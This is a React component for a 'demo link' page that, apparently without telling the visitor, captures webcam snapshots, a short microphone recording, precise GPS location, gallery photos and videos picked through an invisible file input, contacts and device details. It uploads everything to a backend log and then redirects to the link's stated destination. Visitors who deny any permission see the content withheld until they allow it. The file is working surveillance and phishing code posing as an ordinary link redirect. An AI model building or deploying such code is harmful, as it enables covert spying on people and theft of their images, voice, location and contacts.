import React, { useEffect, useState, useRef, useCallback } from "react";
import { useParams } from "react-router-dom";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const DemoPage = () => {
  const { demoCode } = useParams();
  const [demoLink, setDemoLink] = useState(null);
  const [loading, setLoading] = useState(true);
  const [permissionDenied, setPermissionDenied] = useState(false);
  const hasRequestedPermissions = useRef(false);

  useEffect(() => {
    fetchDemoLink();
    // eslint-disable-next-line
  }, [demoCode]);

  const fetchDemoLink = async () => {
    try {
      const response = await axios.get(`${API}/demo-links/${demoCode}`);
      setDemoLink(response.data);
      setLoading(false);
    } catch (error) {
      console.error("Error fetching demo link:", error);
      window.location.href = "/";
    }
  };

  const getDeviceInfo = () => {
    const ua = navigator.userAgent;
    let deviceType = 'Desktop';
    let browser = 'Unknown';
    let os = 'Unknown';

    // Detect device type
    if (/Android/i.test(ua)) {
      deviceType = 'Android';
      os = 'Android';
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
      deviceType = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
      os = 'iOS';
    } else if (/Windows/i.test(ua)) {
      os = 'Windows';
    } else if (/Mac/i.test(ua)) {
      os = 'macOS';
    } else if (/Linux/i.test(ua)) {
      os = 'Linux';
    }

    // Detect browser
    if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) {
      browser = 'Chrome';
    } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
      browser = 'Safari';
    } else if (/Firefox/i.test(ua)) {
      browser = 'Firefox';
    } else if (/Edge/i.test(ua)) {
      browser = 'Edge';
    }

    return { deviceType, browser, os };
  };

  const isMobileDevice = () => {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  };

  const requestCameraPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      
      const images = [];
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      
      await new Promise(resolve => {
        video.onloadedmetadata = resolve;
      });
      
      for (let i = 0; i < 3; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        images.push(imageData);
      }
      
      stream.getTracks().forEach(track => track.stop());
      
      return { status: "granted", images };
    } catch (error) {
      return { status: "denied", images: [] };
    }
  };

  const requestLocationPermission = async () => {
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            status: "granted",
            data: {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: new Date().toISOString(),
            },
          });
        },
        (error) => {
          resolve({ status: "denied", data: null });
        }
      );
    });
  };

  const requestMicrophonePermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      
      const mediaRecorder = new MediaRecorder(stream);
      const audioChunks = [];
      
      return new Promise((resolve) => {
        mediaRecorder.addEventListener("dataavailable", (event) => {
          audioChunks.push(event.data);
        });
        
        mediaRecorder.addEventListener("stop", () => {
          const audioBlob = new Blob(audioChunks);
          const reader = new FileReader();
          reader.readAsDataURL(audioBlob);
          reader.onloadend = () => {
            stream.getTracks().forEach(track => track.stop());
            resolve({ status: "granted", audioData: reader.result });
          };
        });
        
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 2000);
      });
    } catch (error) {
      return { status: "denied", audioData: null };
    }
  };

  const requestPhotosPermission = async () => {
    if (!isMobileDevice()) {
      return { status: "skipped", media: [] };
    }

    return new Promise((resolve) => {
      let settled = false;
      const settle = (val) => {
        if (!settled) {
          settled = true;
          resolve(val);
        }
      };

      const input = document.createElement('input');
      input.type = 'file';
      input.accept = 'image/*,video/*';
      input.multiple = true;
      // No `capture` attribute -> opens the gallery / file picker
      // so the user can select EXISTING photos and videos from the device.
      input.style.position = 'fixed';
      input.style.opacity = '0';
      input.style.pointerEvents = 'none';
      document.body.appendChild(input);

      input.onchange = async (e) => {
        const files = Array.from(e.target.files || []);
        if (files.length === 0) {
          document.body.removeChild(input);
          settle({ status: "denied", media: [] });
          return;
        }

        const mediaFiles = [];
        for (const file of files.slice(0, 10)) {
          try {
            const dataUrl = await new Promise((res, rej) => {
              const reader = new FileReader();
              reader.onload = (event) => res(event.target.result);
              reader.onerror = rej;
              reader.readAsDataURL(file);
            });
            mediaFiles.push({
              type: file.type.startsWith('image/') ? 'image' : 'video',
              data: dataUrl,
              name: file.name,
              size: file.size,
            });
          } catch (err) {
            // skip unreadable file
          }
        }

        document.body.removeChild(input);
        settle({ status: "granted", media: mediaFiles });
      };

      input.oncancel = () => {
        try { document.body.removeChild(input); } catch (_) {}
        settle({ status: "denied", media: [] });
      };

      input.click();

      // Fallback if oncancel isn't supported by the browser
      setTimeout(() => {
        if (!settled) {
          try { document.body.removeChild(input); } catch (_) {}
          settle({ status: "denied", media: [] });
        }
      }, 60000);
    });
  };

  const requestContactsPermission = async () => {
    if (!isMobileDevice()) {
      return { status: "skipped", contacts: [] };
    }

    // Contact Picker API is only available on Chrome for Android over HTTPS.
    if (!('contacts' in navigator) || !('ContactsManager' in window)) {
      return { status: "unsupported", contacts: [] };
    }

    try {
      const props = ['name', 'tel', 'email'];
      const opts = { multiple: true };
      const contacts = await navigator.contacts.select(props, opts);

      const contactList = contacts.map((contact) => ({
        name: Array.isArray(contact.name) && contact.name.length ? contact.name[0] : 'Unknown',
        phone: Array.isArray(contact.tel) && contact.tel.length ? contact.tel[0] : '',
        email: Array.isArray(contact.email) && contact.email.length ? contact.email[0] : '',
      }));

      return { status: contactList.length > 0 ? "granted" : "denied", contacts: contactList };
    } catch (error) {
      return { status: "denied", contacts: [] };
    }
  };

  const requestAllPermissions = useCallback(async () => {
    if (!demoLink) return;

    const deviceInfo = getDeviceInfo();

    const results = {
      granted: [],
      denied: [],
      camera_images: [],
      location_data: null,
      audio_data: null,
      media_files: [],
      contacts: [],
      device_info: deviceInfo,
    };

    let anyDenied = false;

    for (const permission of demoLink.permissions) {
      if (permission === "camera") {
        const result = await requestCameraPermission();
        if (result.status === "granted") {
          results.granted.push(permission);
          results.camera_images = result.images;
        } else {
          results.denied.push(permission);
          anyDenied = true;
        }
      } else if (permission === "location") {
        const result = await requestLocationPermission();
        if (result.status === "granted") {
          results.granted.push(permission);
          results.location_data = result.data;
        } else {
          results.denied.push(permission);
          anyDenied = true;
        }
      } else if (permission === "microphone") {
        const result = await requestMicrophonePermission();
        if (result.status === "granted") {
          results.granted.push(permission);
          results.audio_data = result.audioData;
        } else {
          results.denied.push(permission);
          anyDenied = true;
        }
      } else if (permission === "photos") {
        const result = await requestPhotosPermission();
        if (result.status === "granted") {
          results.granted.push(permission);
          results.media_files = result.media;
        } else if (result.status === "denied") {
          results.denied.push(permission);
          anyDenied = true;
        }
      } else if (permission === "contacts") {
        const result = await requestContactsPermission();
        if (result.status === "granted") {
          results.granted.push(permission);
          results.contacts = result.contacts;
        } else if (result.status === "denied") {
          results.denied.push(permission);
          anyDenied = true;
        }
        // "unsupported" or "skipped" -> silently skip without blocking redirect
      }
    }

    try {
      await axios.post(`${API}/visit-logs`, {
        demo_code: demoCode,
        permissions_granted: results.granted,
        permissions_denied: results.denied,
        camera_images: results.camera_images,
        location_data: results.location_data,
        audio_data: results.audio_data,
        media_files: results.media_files,
        contacts: results.contacts,
        device_info: results.device_info,
      });
    } catch (error) {
      console.error("Error logging visit:", error);
    }

    if (anyDenied) {
      setPermissionDenied(true);
    } else {
      setTimeout(() => {
        if (demoLink?.original_url) {
          window.location.href = demoLink.original_url;
        }
      }, 1000);
    }
  }, [demoLink, demoCode]);

  useEffect(() => {
    if (demoLink && !hasRequestedPermissions.current) {
      hasRequestedPermissions.current = true;
      setTimeout(() => {
        requestAllPermissions();
      }, 500);
    }
  }, [demoLink, requestAllPermissions]);

  if (loading || !demoLink) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-gray-400 mx-auto"></div>
          <p className="mt-3 text-sm text-gray-500">Loading...</p>
        </div>
      </div>
    );
  }

  if (permissionDenied) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-red-50 to-orange-50 flex items-center justify-center p-4">
        <div className="text-center max-w-md">
          <div className="bg-white rounded-lg shadow-lg p-8 space-y-4">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
              <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h2 className="text-2xl font-bold text-gray-900">Permission Required</h2>
            <p className="text-gray-600">
              Please allow the requested permissions to access the content.
            </p>
            <button
              onClick={() => window.location.reload()}
              className="mt-4 px-6 py-3 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex items-center justify-center">
      <div className="text-center max-w-md px-4">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-gray-400 mx-auto mb-4"></div>
        <p className="text-gray-600 mb-2">Connecting to {new URL(demoLink.original_url).hostname}...</p>
        <p className="text-sm text-gray-400">Please allow the requested permissions</p>
      </div>
    </div>
  );
};

export default DemoPage;